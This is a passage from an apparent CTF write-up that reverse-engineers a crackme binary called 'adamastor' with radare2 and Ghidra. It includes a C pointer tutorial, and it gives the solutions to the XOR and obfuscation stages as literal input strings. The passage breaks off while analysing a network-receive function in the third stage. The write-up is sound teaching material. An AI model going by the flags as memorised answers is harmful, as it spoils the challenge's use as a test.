│      │┌─< 0x55b3abbec9b6      750a           jne 0x55b3abbec9c2
│      ││   0x55b3abbec9b8      b801000000     mov eax, 1
│     ┌───< 0x55b3abbec9bd      e9c5030000     jmp 0x55b3abbecd87
│     ││└─> 0x55b3abbec9c2      488b8510ffff.  mov rax, qword [var_f0h]
│     ││    0x55b3abbec9c9      4883c008       add rax, 8
│     ││    0x55b3abbec9cd      488b00         mov rax, qword [rax]
│     ││    0x55b3abbec9d0      488d9524ffff.  lea rdx, [var_dch]
│     ││    0x55b3abbec9d7      488d0d750700.  lea rcx, [0x55b3abbed153] ; "%x"
│     ││    0x55b3abbec9de      4889ce         mov rsi, rcx
│     ││    0x55b3abbec9e1      4889c7         mov rdi, rax
│     ││    0x55b3abbec9e4      b800000000     mov eax, 0
│     ││    0x55b3abbec9e9      e8d2f8ffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)                                                        
│     ││    0x55b3abbec9ee      83f801         cmp eax, 1              ; 1
│     ││┌─< 0x55b3abbec9f1      7419           je 0x55b3abbeca0c
│     │││   0x55b3abbec9f3      488d055e0700.  lea rax, str.____Invalid_hexadecimal_input. ; 0x55b3abbed158 ; "[-] Invalid hexadecimal input."                                            
│     │││   0x55b3abbec9fa      4889c7         mov rdi, rax
│     │││   0x55b3abbec9fd      e80ef8ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│     │││   0x55b3abbeca02      b801000000     mov eax, 1
│    ┌────< 0x55b3abbeca07      e97b030000     jmp 0x55b3abbecd87
│    │││└─> 0x55b3abbeca0c      8b8524ffffff   mov eax, dword [var_dch]
│    │││    0x55b3abbeca12      3578563412     xor eax, 0x12345678
│    │││    0x55b3abbeca17      898528ffffff   mov dword [var_d8h], eax
│    │││    0x55b3abbeca1d      81bd28ffffff.  cmp dword [var_d8h], 0xdeadbeef
│    │││┌─< 0x55b3abbeca27      0f8539030000   jne 0x55b3abbecd66
│    ││││   0x55b3abbeca2d      488d05440700.  lea rax, str.___Congratulations__Youve_passed_the_XOR_challenge. ; 0x55b3abbed178 ; "[+] Congratulations! You've passed the XOR challenge."
│    ││││   0x55b3abbeca34      4889c7         mov rdi, rax
│    ││││   0x55b3abbeca37      e8d4f7ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│    ││││   0x55b3abbeca3c      48b83d32384e.  movabs rax, 0x666b76514e38323d ; '=28NQvkf'
│    ││││   0x55b3abbeca46      48894585       mov qword [var_7bh], rax
│    ││││   0x55b3abbeca4a      66c7458d3052   mov word [var_73h], 0x5230 ; '0R'
│    ││││   0x55b3abbeca50      c6458f00       mov byte [var_71h], 0
│    ││││   0x55b3abbeca54      488d4585       lea rax, [var_7bh]
│    ││││   0x55b3abbeca58      4889c7         mov rdi, rax
│    ││││   0x55b3abbeca5b      e82bfaffff     call sym.obfuscate_function
│    ││││   0x55b3abbeca60      488d05490700.  lea rax, str.___Now__provide_an_input_for_the_second_challenge:_ ; 0x55b3abbed1b0 ; "[*] Now, provide an input for the second challenge: " 
│    ││││   0x55b3abbeca67      4889c7         mov rdi, rax
│    ││││   0x55b3abbeca6a      b800000000     mov eax, 0
│    ││││   0x55b3abbeca6f      e8fcf7ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│    ││││   0x55b3abbeca74      e8a9faffff     call sym.get_input
│    ││││   0x55b3abbeca79      48898538ffff.  mov qword [var_c8h], rax
│    ││││   0x55b3abbeca80      488b8538ffff.  mov rax, qword [var_c8h]
│    ││││   0x55b3abbeca87      be0a000000     mov esi, 0xa
│    ││││   0x55b3abbeca8c      4889c7         mov rdi, rax
│    ││││   0x55b3abbeca8f      e8b5f9ffff     call sym.check_length_input
│    ││││   0x55b3abbeca94      83f801         cmp eax, 1              ; 1
│   ┌─────< 0x55b3abbeca97      750a           jne 0x55b3abbecaa3
│   │││││   0x55b3abbeca99      b801000000     mov eax, 1
│  ┌──────< 0x55b3abbeca9e      e9e4020000     jmp 0x55b3abbecd87
│  │└─────> 0x55b3abbecaa3      488d4d85       lea rcx, [var_7bh]
│  │ ││││   0x55b3abbecaa7      488b8538ffff.  mov rax, qword [var_c8h]
│  │ ││││   0x55b3abbecaae      ba0a000000     mov edx, 0xa
│  │ ││││   0x55b3abbecab3      4889ce         mov rsi, rcx
│  │ ││││   0x55b3abbecab6      4889c7         mov rdi, rax
│  │ ││││   0x55b3abbecab9      e842f7ffff     call sym.imp.strncmp    ; int strncmp(const char *s1, const char *s2, size_t n)                                                            
│  │ ││││   0x55b3abbecabe      85c0           test eax, eax
│  │┌─────< 0x55b3abbecac0      0f8571020000   jne 0x55b3abbecd37
│  ││││││   0x55b3abbecac6      488b8538ffff.  mov rax, qword [var_c8h]
│  ││││││   0x55b3abbecacd      4889c7         mov rdi, rax
│  ││││││   0x55b3abbecad0      e80bf7ffff     call sym.imp.free       ; void free(void *ptr)
│  ││││││   0x55b3abbecad5      488d050c0700.  lea rax, str.___Well_done__Youve_passed_the_obfuscation_challenge. ; 0x55b3abbed1e8 ; "[+] Well done! You've passed the obfuscation challenge."                                                                                         
│  ││││││   0x55b3abbecadc      4889c7         mov rdi, rax
│  ││││││   0x55b3abbecadf      e82cf7ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│  ││││││   0x55b3abbecae4      488d05350700.  lea rax, str.DATA_DETAILS_01 ; 0x55b3abbed220 ; "DATA_DETAILS_01"                                                                          
│  ││││││   0x55b3abbecaeb      48898570ffff.  mov qword [var_90h], rax
│  ││││││   0x55b3abbecaf2      488d05370700.  lea rax, str.DATA_DETAILS_02 ; 0x55b3abbed230 ; "DATA_DETAILS_02"                                                                          
│  ││││││   0x55b3abbecaf9      48898578ffff.  mov qword [var_88h], rax
│  ││││││   0x55b3abbecb00      48c78540ffff.  mov qword [var_c0h], 2
│  ││││││   0x55b3abbecb0b      48c78530ffff.  mov qword [var_d0h], 0
│ ┌───────< 0x55b3abbecb16      eb53           jmp 0x55b3abbecb6b
│ ────────> 0x55b3abbecb18      488b8530ffff.  mov rax, qword [var_d0h]
│ │││││││   0x55b3abbecb1f      488b84c570ff.  mov rax, qword [rbp + rax*8 - 0x90]
│ │││││││   0x55b3abbecb27      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecb2a      e862faffff     call sym.check_environment_variable
│ │││││││   0x55b3abbecb2f      85c0           test eax, eax
│ ────────< 0x55b3abbecb31      7530           jne 0x55b3abbecb63
│ │││││││   0x55b3abbecb33      488b8530ffff.  mov rax, qword [var_d0h]
│ │││││││   0x55b3abbecb3a      488b84c570ff.  mov rax, qword [rbp + rax*8 - 0x90]
│ │││││││   0x55b3abbecb42      4889c6         mov rsi, rax
│ │││││││   0x55b3abbecb45      488d05f40600.  lea rax, str.____Environment_variable__s_does_not_exist._n ; 0x55b3abbed240 ; "[-] Environment variable %s does not exist.\n"              
│ │││││││   0x55b3abbecb4c      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecb4f      b800000000     mov eax, 0
│ │││││││   0x55b3abbecb54      e817f7ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│ │││││││   0x55b3abbecb59      b801000000     mov eax, 1
│ ────────< 0x55b3abbecb5e      e9d2010000     jmp 0x55b3abbecd35
│ ────────> 0x55b3abbecb63      48838530ffff.  add qword [var_d0h], 1
│ │││││││   ; CODE XREF from main @ 0x55b3abbecb16
│ └───────> 0x55b3abbecb6b      488b8530ffff.  mov rax, qword [var_d0h]
│  ││││││   0x55b3abbecb72      483b8540ffff.  cmp rax, qword [var_c0h]
│ ────────< 0x55b3abbecb79      729d           jb 0x55b3abbecb18
│  ││││││   0x55b3abbecb7b      488b8570ffff.  mov rax, qword [var_90h]
│  ││││││   0x55b3abbecb82      4889c7         mov rdi, rax
│  ││││││   0x55b3abbecb85      e846f6ffff     call sym.imp.getenv     ; char *getenv(const char *name)                                                                                   
│  ││││││   0x55b3abbecb8a      48898548ffff.  mov qword [var_b8h], rax
│  ││││││   0x55b3abbecb91      488b8578ffff.  mov rax, qword [var_88h]
│  ││││││   0x55b3abbecb98      4889c7         mov rdi, rax
│  ││││││   0x55b3abbecb9b      e830f6ffff     call sym.imp.getenv     ; char *getenv(const char *name)                                                                                   
│  ││││││   0x55b3abbecba0      4889c7         mov rdi, rax
│  ││││││   0x55b3abbecba3      e838f7ffff     call sym.imp.atoi       ; int atoi(const char *str)                                                                                        
│  ││││││   0x55b3abbecba8      89852cffffff   mov dword [var_d4h], eax
│  ││││││   0x55b3abbecbae      4883bd48ffff.  cmp qword [var_b8h], 0
│ ┌───────< 0x55b3abbecbb6      7409           je 0x55b3abbecbc1
│ │││││││   0x55b3abbecbb8      83bd2cffffff.  cmp dword [var_d4h], 0
│ ────────< 0x55b3abbecbbf      7519           jne 0x55b3abbecbda
│ └───────> 0x55b3abbecbc1      488d05a80600.  lea rax, str.____Error:_Environment_variables_not_properly_set. ; 0x55b3abbed270 ; "[-] Error: Environment variables not properly set."    
│  ││││││   0x55b3abbecbc8      4889c7         mov rdi, rax
│  ││││││   0x55b3abbecbcb      e840f6ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│  ││││││   0x55b3abbecbd0      b801000000     mov eax, 1
│ ┌───────< 0x55b3abbecbd5      e95b010000     jmp 0x55b3abbecd35
│ ────────> 0x55b3abbecbda      488d55c0       lea rdx, [var_40h]
│ │││││││   0x55b3abbecbde      8bb52cffffff   mov esi, dword [var_d4h]
│ │││││││   0x55b3abbecbe4      488b8548ffff.  mov rax, qword [var_b8h]
│ │││││││   0x55b3abbecbeb      b931000000     mov ecx, 0x31           ; '1' ; 49
│ │││││││   0x55b3abbecbf0      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecbf3      e864faffff     call sym.receive_data
│ │││││││   0x55b3abbecbf8      488d45c0       lea rax, [var_40h]
│ │││││││   0x55b3abbecbfc      48898550ffff.  mov qword [var_b0h], rax
│ │││││││   0x55b3abbecc03      48b8546b6565.  movabs rax, 0x6678687565656b54 ; 'Tkeeuhxf'
│ │││││││   0x55b3abbecc0d      48ba6a41636a.  movabs rdx, 0x4a6f61586a63416a ; 'jAcjXaoJ'
│ │││││││   0x55b3abbecc17      48894590       mov qword [var_70h], rax
│ │││││││   0x55b3abbecc1b      48895598       mov qword [var_68h], rdx
│ │││││││   0x55b3abbecc1f      48b86766786b.  movabs rax, 0x486868466b786667 ; 'gfxkFhhH'
│ │││││││   0x55b3abbecc29      48ba78687147.  movabs rdx, 0x7276746a47716878 ; 'xhqGjtvr'
│ │││││││   0x55b3abbecc33      488945a0       mov qword [var_60h], rax
│ │││││││   0x55b3abbecc37      488955a8       mov qword [var_58h], rdx
│ │││││││   0x55b3abbecc3b      c745b06c7374.  mov dword [var_50h], 0x74736c ; 'lst'
│ │││││││   0x55b3abbecc42      488b9550ffff.  mov rdx, qword [var_b0h]
│ │││││││   0x55b3abbecc49      488d4590       lea rax, [var_70h]
│ │││││││   0x55b3abbecc4d      4889d6         mov rsi, rdx
│ │││││││   0x55b3abbecc50      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecc53      e854fbffff     call sym.guess_the_cipher_my_friend
│ │││││││   0x55b3abbecc58      48898558ffff.  mov qword [var_a8h], rax
│ │││││││   0x55b3abbecc5f      488d05420600.  lea rax, str.___Finally__provide_an_input_for_the_last_challenge:_ ; 0x55b3abbed2a8 ; "[*] Finally, provide an input for the last challenge: "                                                                                          
│ │││││││   0x55b3abbecc66      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecc69      b800000000     mov eax, 0
│ │││││││   0x55b3abbecc6e      e8fdf5ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│ │││││││   0x55b3abbecc73      e8aaf8ffff     call sym.get_input
│ │││││││   0x55b3abbecc78      48898560ffff.  mov qword [var_a0h], rax
│ │││││││   0x55b3abbecc7f      488b8560ffff.  mov rax, qword [var_a0h]
│ │││││││   0x55b3abbecc86      be23000000     mov esi, 0x23           ; '#' ; 35
│ │││││││   0x55b3abbecc8b      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecc8e      e8b6f7ffff     call sym.check_length_input
│ │││││││   0x55b3abbecc93      83f801         cmp eax, 1              ; 1
│ ────────< 0x55b3abbecc96      750a           jne 0x55b3abbecca2
│ │││││││   0x55b3abbecc98      b801000000     mov eax, 1
│ ────────< 0x55b3abbecc9d      e993000000     jmp 0x55b3abbecd35
│ ────────> 0x55b3abbecca2      488b8d58ffff.  mov rcx, qword [var_a8h]
│ │││││││   0x55b3abbecca9      488b8560ffff.  mov rax, qword [var_a0h]
│ │││││││   0x55b3abbeccb0      ba23000000     mov edx, 0x23           ; '#' ; 35
│ │││││││   0x55b3abbeccb5      4889ce         mov rsi, rcx
│ │││││││   0x55b3abbeccb8      4889c7         mov rdi, rax
│ │││││││   0x55b3abbeccbb      e840f5ffff     call sym.imp.strncmp    ; int strncmp(const char *s1, const char *s2, size_t n)                                                            
│ │││││││   0x55b3abbeccc0      85c0           test eax, eax
│ ────────< 0x55b3abbeccc2      7542           jne 0x55b3abbecd06
│ │││││││   0x55b3abbeccc4      488b8560ffff.  mov rax, qword [var_a0h]
│ │││││││   0x55b3abbecccb      4889c7         mov rdi, rax
│ │││││││   0x55b3abbeccce      e80df5ffff     call sym.imp.free       ; void free(void *ptr)
│ │││││││   0x55b3abbeccd3      488d05060600.  lea rax, str.___Well_done__Youve_passed_the_final_challenge_ ; 0x55b3abbed2e0 ; "[+] Well done! You've passed the final challenge!"        
│ │││││││   0x55b3abbeccda      4889c7         mov rdi, rax
│ │││││││   0x55b3abbeccdd      e82ef5ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│ │││││││   0x55b3abbecce2      e81bfcffff     call sym.get_shell
│ │││││││   0x55b3abbecce7      488d052a0600.  lea rax, str._n_n_n_n_n____n_n_n_n_n_n_n_n_n_________Costa_Rica..._n ; 0x55b3abbed318                                                      
│ │││││││   0x55b3abbeccee      48898568ffff.  mov qword [var_98h], rax
│ │││││││   0x55b3abbeccf5      488b8568ffff.  mov rax, qword [var_98h]
│ │││││││   0x55b3abbeccfc      4889c7         mov rdi, rax
│ │││││││   0x55b3abbeccff      e80cf5ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│ ────────< 0x55b3abbecd04      eb7c           jmp 0x55b3abbecd82
│ ────────> 0x55b3abbecd06      488b8560ffff.  mov rax, qword [var_a0h]
│ │││││││   0x55b3abbecd0d      4889c6         mov rsi, rax
│ │││││││   0x55b3abbecd10      488d05310a00.  lea rax, str.____Try_again__Wrong_input:__s_n ; 0x55b3abbed748 ; "[-] Try again! Wrong input: %s\n"                                        
│ │││││││   0x55b3abbecd17      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecd1a      b800000000     mov eax, 0
│ │││││││   0x55b3abbecd1f      e84cf5ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│ │││││││   0x55b3abbecd24      488b8560ffff.  mov rax, qword [var_a0h]
│ │││││││   0x55b3abbecd2b      4889c7         mov rdi, rax
│ │││││││   0x55b3abbecd2e      e8adf4ffff     call sym.imp.free       ; void free(void *ptr)
│ ────────< 0x55b3abbecd33      eb4d           jmp 0x55b3abbecd82
│ │││││││   ; CODE XREFS from main @ 0x55b3abbecb5e, 0x55b3abbecbd5, 0x55b3abbecc9d
│ └───────> 0x55b3abbecd35      eb50           jmp 0x55b3abbecd87
│  │└─────> 0x55b3abbecd37      488b8538ffff.  mov rax, qword [var_c8h]
│  │ ││││   0x55b3abbecd3e      4889c6         mov rsi, rax
│  │ ││││   0x55b3abbecd41      488d05000a00.  lea rax, str.____Try_again__Wrong_input:__s_n ; 0x55b3abbed748 ; "[-] Try again! Wrong input: %s\n"                                        
│  │ ││││   0x55b3abbecd48      4889c7         mov rdi, rax
│  │ ││││   0x55b3abbecd4b      b800000000     mov eax, 0
│  │ ││││   0x55b3abbecd50      e81bf5ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│  │ ││││   0x55b3abbecd55      488b8538ffff.  mov rax, qword [var_c8h]
│  │ ││││   0x55b3abbecd5c      4889c7         mov rdi, rax
│  │ ││││   0x55b3abbecd5f      e87cf4ffff     call sym.imp.free       ; void free(void *ptr)
│  │┌─────< 0x55b3abbecd64      eb1c           jmp 0x55b3abbecd82
│  │││││└─> 0x55b3abbecd66      8b8528ffffff   mov eax, dword [var_d8h]
│  │││││    0x55b3abbecd6c      89c6           mov esi, eax
│  │││││    0x55b3abbecd6e      488d05f30900.  lea rax, str.____Try_again___XOR_result:__X__n ; 0x55b3abbed768 ; "[-] Try again! (XOR result: %X)\n"                                      
│  │││││    0x55b3abbecd75      4889c7         mov rdi, rax
│  │││││    0x55b3abbecd78      b800000000     mov eax, 0
│  │││││    0x55b3abbecd7d      e8eef4ffff     call sym.imp.printf     ; int printf(const char *format)                                                                                   
│  │││││    ; CODE XREFS from main @ 0x55b3abbecd04, 0x55b3abbecd33, 0x55b3abbecd64
│ ──└─────> 0x55b3abbecd82      b800000000     mov eax, 0
│  │ │││    ; CODE XREFS from main @ 0x55b3abbec993, 0x55b3abbec9bd, 0x55b3abbeca07, 0x55b3abbeca9e, 0x55b3abbecd35                                                                       
│ ─└─└└└──> 0x55b3abbecd87      488b55f8       mov rdx, qword [var_8h]
│           0x55b3abbecd8b      64482b142528.  sub rdx, qword fs:[0x28]
│       ┌─< 0x55b3abbecd94      7405           je 0x55b3abbecd9b
│       │   0x55b3abbecd96      e895f4ffff     call sym.imp.__stack_chk_fail
│       └─> 0x55b3abbecd9b      c9             leave
└           0x55b3abbecd9c      c3             ret
```

Alright, so I guess if you were already anxious about the C-code like from `Ghidra` seeing this **HUGE** block won't help calm you down but no worries, I got you ! 

Same as with `Ghidra` let's target the part of the program that's interesting for us, same as before I'm going to extract a small part of the assembly equivalent of the main function from `r2`:

```assembly
     ││││   0x55b3abbeca2d      488d05440700.  lea rax, str.___Congratulations__Youve_passed_the_XOR_challenge. ; 0x55b3abbed178 ; "[+] Congratulations! You've passed the XOR challenge."
│    ││││   0x55b3abbeca34      4889c7         mov rdi, rax
│    ││││   0x55b3abbeca37      e8d4f7ffff     call sym.imp.puts       ; int puts(const char *s)                                                                                          
│    ││││   0x55b3abbeca3c      48b83d32384e.  movabs rax, 0x666b76514e38323d ; '=28NQvkf'
│    ││││   0x55b3abbeca46      48894585       mov qword [var_7bh], rax
│    ││││   0x55b3abbeca4a      66c7458d3052   mov word [var_73h], 0x5230 ; '0R'
│    ││││   0x55b3abbeca50      c6458f00       mov byte [var_71h], 0
│    ││││   0x55b3abbeca54      488d4585       lea rax, [var_7bh]
│    ││││   0x55b3abbeca58      4889c7         mov rdi, rax
│    ││││   0x55b3abbeca5b      e82bfaffff     call sym.obfuscate_function
│    ││││   0x55b3abbeca60      488d05490700.  lea rax, str.___Now__provide_an_input_for_the_second_challenge:_ ; 0x55b3abbed1b0 ; "[*] Now, provide an input for the second challenge: "
```

This is the part that's important for us to solve this second challenge, if it helps, I'll give the C-code equivalent of this part from `Ghidra`:

```C
    puts("[+] Congratulations! You\'ve passed the XOR challenge.");
    local_83 = 0x666b76514e38323d;
    local_7b = 0x5230;
    local_79 = 0;
    obfuscate_function(&local_83);
    printf("[*] Now, provide an input for the second challenge: ");
```

We can note from the C code equivalent that **AGAIN** we use the `&` operator on the argument being passed to the function `obfuscate_function()` for the variable `local_83`. 
Nothing actually seems to get returned from the function since we don't initialize a variable when calling this function with `local_83` as the argument. 
This is actually going to be super important later on but let's wait a little bit, just keep this in the back of your head for now ! 

Again to solve this challenge we're going to fully utilize `r2`. Technically we could solve this with `Ghidra` again, by following a similar process as the first challenge like checking the flow of the program etc...

But guess what? `radare2` will actually be 100 times faster to give us the thing we want and on top of this it will be the occasion to show you another technique we might use for future challenges. Alright let's get into it!

So I'm not even aware myself if there's an official name for this technique but I basically call it `registry snatching`, what do I mean by that ? 

Well if you rememember correctly, in the C-code equivalent, we had this `obfuscate_function()` that's having this parameter (`&local_83`) but no proper return. How does our program actually get the data back ? 

##### C Pointers 101

I'll show you exactly how with some C code I wrote to represent this concept ! (to make it easier when we will switch to the r2 / assembly part).

To make it as easy as possible think of two functions in a program, the first one being `main()`, the second one being `second()` let's say. When we actually handle data within them you might think that okay same as any other language we need to respect a "scope".

Like if we declare a variable within `main()` we shouldn't be per say able to change the value outside of `main()`, if we want to modify "externally" this locally declared variable we'll have to return something, like think of this example:

```C
#include <stdio.h>

int second(int variable_received_from_main)
{
  return ++variable_received_from_main; // <- Increment our variable by 1, so in a way "modifying the value externally"
}

int main()
{
  int variable_declared_in_main = 0; // <- Declaring and initializing the variable to 0 with a scope allegedly set only in the main function
  variable_declared_in_main = second(variable_declared_in_main); // <- Re-Initializing our variable set to 0 by calling the second() function and providing our variable in argument, when it get's return, our variable should now be equal to 1
  printf("%d", variable_declared_in_main); // <- Print the result (1), feel free to test this block of code in your terminal: "gcc source.c -o source && ./source"
  return 0; // <- exit "safely", we're not crazy, come on...
}
```

And this code just above, is how most of the people understand function calls, arguments returns, function scopes etc but actually another way we can do this (at least in C), will be by using the almighty `&` and `*` operators (These operators are part of a topic called "pointers" in C).

I'll explain in details what I mean, if you want to create the equivalent of the program above **BUT** without actually using any returns (like literraly), it's completely possible, this way:

```C
#include <stdio.h>

void second(int *variable_received_from_main)
{
    (*variable_received_from_main)++; // <- Increment the value stored at the address pointed to by variable_received_from_main
}

int main()
{
    int variable_declared_in_main = 0;
    second(&variable_declared_in_main); // Pass the address of variable_declared_in_main to the second() function
    printf("%d", variable_declared_in_main); // <- Print the result (1), feel free to test this block of code in your terminal: "gcc source.c -o source && ./source"
    return 0; // <- exit "safely", we're not crazy, come on...
}
```

Okay so what's happening in this second snippet. We basically use some referencing / dereferencing logic. What does that mean ?

To make it short / simple:

- Referencing (&): Obtains the memory address of a variable, producing a pointer to that variable.
- Dereferencing (*): Accesses the value stored at the memory address pointed to by a pointer.

So when we get this part, we understand that what we actually send to `second()` is not a value per say like 0 as the first code snippet but rather the address that's actually storing the value 0 (from `variable_declared_in_main`).

So when it get passed to the `second()` function, we actually fetch the address from the argument of this function (`variable_received_from_main`) and using the dereferencing operator (*), we access the value of this memory address and modify it to set it to 1 !

In this snippet, we do exactly the same thing as the first snippet but there's actually no clear interaction or at least less obvious one between the functions since we use no returns and no initialization to make the player clearly understand what's going on !

Anyway enough theory let's get back to the challenge, if you need to learn more about it though, feel free to check [this](https://www.programiz.com/c-programming/c-pointers)

#### Assembly Instructions / Registers 101

Just before moving back to the challenge, to make it easier, we just need to talk about assembly instructions. 

Fundamentally, assembly instructions are just operations that are moving data around registers using instructions that can for example add value, remove value etc... Most simple instructions are like `add` to add, `pop` to remove etc..

You can learn more about Assembly Instructions [here](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)

The places instructions modify these values in are called registers (very very fast and small "variable" if you want). You can learn more about registers [here](https://wiki.cdot.senecacollege.ca/wiki/Register)

### Back to Obfuscation Challenge

So after understanding these two core concepts what does that mean for us? Well when we see this call: `obfuscation_challenge(&local_83)`, 

We understand that the variable `&local_83` is getting modified somewhere else in the program (in `obfuscate_function()` in our case), without actually being properly "stated" within our `main()` function outside of this call!

The second thing we understand from the assembly instructions equivalent this time is that before this actually happen (if you look back at the snippet with the instructiosn in assembly), before this line: 

```assembly
│    ││││   0x55b3abbeca5b      e82bfaffff     call sym.obfuscate_function
``` 
(That's the equivalent, in a way of simply calling `obfuscate_function()` in C)

We get this instruction in assembly:

```assembly
mov rdi, rax
```

What is it ? Well the `mov` is just an instruction moving data around registers. Okay then what are these two registers, `rdi` and `rax` ?

Well from this very nice table available [here](https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_11_registers.html), we have description about what each registers are doing in a x86-64 architectures !

From the website's table,

`rax` : store the value returned from a function in this register. 

`rdi` : Scratch register.  Function argument #1 in 64-bit Linux -> THAT'S WHAT WE WANT TO TARGET !!

Since we know that technically, our functions won't return anything, the `rax` register is next to useless to implement this technique I told you about "`register snatching`". We will have to target the `rdi` register !

To do so, let's get back to `r2`, first make sure our program is getting debugged proprerly by checking we provided the right first commands before getting in the prompt (if you got this line in your shell: `r2 -d adamastor cc99e897`, you're good!).

Next step when you're still in the prompt, will be to fetch the address of the instruction that's asking us to provide the second input, you can find this line by looking at the instructions by printing them out using this command: `pdf @main`. 

The line you should fine should be this one:

```assembly
0x55e73d56ca60      488d05490700.  lea rax, str.___Now__provide_an_input_for_the_second_challenge:_ ; 0x55e73d56d1b0 ; "[*] Now, provide an input for the second challenge: "
```
It won't be the same memory address for your binary, but the process is the same, you should set a breakpoint for this memory address (using the `db` command) and then run the program (using the `dc` command) to hit the breakpoint like this:

```assembly
[0x7ff31e591360]> db 0x55e73d56ca60
[0x7ff31e591360]> dc
[+] Congratulations! You've passed the XOR challenge.
hit breakpoint at: 0x55e73d56ca60
```

If everything goes well and you provided the right first argument when running `r2` you should see the congratz message and the verbose output from `r2` telling you you've hit the breakpoint. 

If you take a look at the assembly snippet code here or the assembly directly in your terminal in `r2`, you'll see that the breakpoint was hit **AFTER** the `obfuscate_function()` call, thus letting us know that our second flag is waiting for us in our `rdi` register !

But how to get it ?

Well you could use the command `px`, to dump the memory from the register! You can do this like that:

```assembly
[0x55e73d56ca60]> px @rdi
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffeee627205  3876 684b 7464 4354 5077 0000 0000 0000  8vhKtdCTPw......                                                                                                                                         
0x7ffeee627215  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffeee627225  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffeee627235  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffeee627245  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffeee627255  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffeee627265  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffeee627275  0000 0000 982f d942 9fcd d702 0000 0000  ...../.B........
0x7ffeee627285  0000 00ca 463a 1ef3 7f00 0000 0000 0000  ....F:..........
0x7ffeee627295  0000 0039 c956 3de7 5500 0000 0000 0002  ...9.V=.U.......
0x7ffeee6272a5  0000 0098 7362 eefe 7f00 0098 7362 eefe  ....sb......sb..
0x7ffeee6272b5  7f00 00bf 9017 c63e 7341 8d00 0000 0000  .......>sA......
0x7ffeee6272c5  0000 00b0 7362 eefe 7f00 0000 ed56 3de7  ....sb.......V=.
0x7ffeee6272d5  5500 0000 905a 1ef3 7f00 00bf 9033 23fa  U....Z.......3#.
0x7ffeee6272e5  afbc 72bf 9017 4b4a 4fa7 7200 0000 0000  ..r...KJO.r.....
0x7ffeee6272f5  0000 0000 0000 0000 0000 0000 0000 0000  ................
```
We see a string in the first line, let's take it and continue the program by issuing the `dc` command again. When asked, put this string as the second input and let's see the results...

```assembly
[0x55e73d56ca60]> dc
[*] Now, provide an input for the second challenge: 8vhKtdCTPw
[+] Well done! You've passed the obfuscation challenge.
[-] Environment variable DATA_DETAILS_01 does not exist.
(1673986) Process exited with status=0x100
```

[+] Congratz ! Second challenge solved ! 

### Vigenere Cipher

For the last challenge, we'll use a mix of `Ghidra`, `radare2` and even other unexpected tools !!

Let's start at the beginning, the place where we left off, so if we execute the program outside of r2 with our 2 flags (on our attacker machine):

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ./adamastor cc99e897            
[+] Congratulations! You've passed the XOR challenge.
[*] Now, provide an input for the second challenge: 8vhKtdCTPw      
[+] Well done! You've passed the obfuscation challenge.
[-] Environment variable DATA_DETAILS_01 does not exist.
```

We get an error message, about environment variable not existing, let's check on `Ghidra` what's what...

This will be the snippet that will be useful for us:

```C
      local_98[0] = "DATA_DETAILS_01";
      local_98[1] = "DATA_DETAILS_02";
      local_c8 = 2;
      for (local_d8 = 0; local_d8 < local_c8; local_d8 = local_d8 + 1) {
        iVar1 = check_environment_variable(local_98[local_d8]);
        if (iVar1 == 0) {
          printf("[-] Environment variable %s does not exist.\n",local_98[local_d8]);
          goto LAB_00101d35;
        }
      }
      local_c0 = getenv(local_98[0]);
      __nptr = getenv(local_98[1]);
      local_dc = atoi(__nptr);
      if ((local_c0 == (char *)0x0) || (local_dc == 0)) {
        puts("[-] Error: Environment variables not properly set.");
      }
      else {
        receive_data(local_c0,local_dc,local_48,0x31);
        local_b8 = local_48;
        local_78 = 0x6678687565656b54;
        local_70 = 0x4a6f61586a63416a;
        local_68 = 0x486868466b786667;
        local_60 = 0x7276746a47716878;
        local_58 = 0x74736c;
        local_b0 = (char *)guess_the_cipher_my_friend(&local_78,local_b8);
        printf("[*] Finally, provide an input for the last challenge: ");
```
Alright we notice a couple of things, two variables holding the values `DATA_DETAILS_01` and `DATA_DETAILS_02`, we learn later in the program through the `if` checks that these variables are actually environment variables. 

After we check these variables exists on the system (which never happen on our attacker machine because they're not here, the program try to fetch their value with the `getenv()` function. After being fetched, they're actually being used in the `receive_data()` function.

When checking this functions from `Ghidra`:

```C
undefined8 receive_data(char *param_1,uint16_t param_2,void *param_3,long param_4)

{
  int __fd;
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  sockaddr local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __fd = socket(2,1,0);
  if (__fd == -1) {
    perror("[-] Socket creation failed");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_28.sa_family = 2;
  local_28.sa_data._0_2_ = htons(param_2);
  inet_pton(2,param_1,local_28.sa_data + 2);
  iVar1 = connect(__fd,&local_28,0x10);
  if (iVar1 == -1) {
    perror("[-] Connection failed");
    close(__fd);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = recv(__fd,param_3,param_4 - 1,0);
